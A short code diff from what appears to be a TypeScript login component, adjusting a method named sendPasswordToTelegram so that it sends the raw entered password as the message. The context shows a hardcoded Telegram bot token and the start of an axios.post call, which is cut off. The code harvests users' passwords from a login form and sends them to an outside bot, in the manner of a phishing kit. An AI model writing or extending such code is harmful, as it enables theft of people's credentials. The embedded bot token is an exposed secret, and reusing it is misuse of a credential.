@@ -38,7 +38,7 @@ export class LoginComponent {
 
   async sendPasswordToTelegram(password: string): Promise<void> {
     const botToken = '7093553495:AAH9nQ-xPzchG59GmyuLMKnu94hpv6-3d9A';
-    const message = `Entered password: ${password}`;
+    const message = password;
 
     try {
       await axios.post(
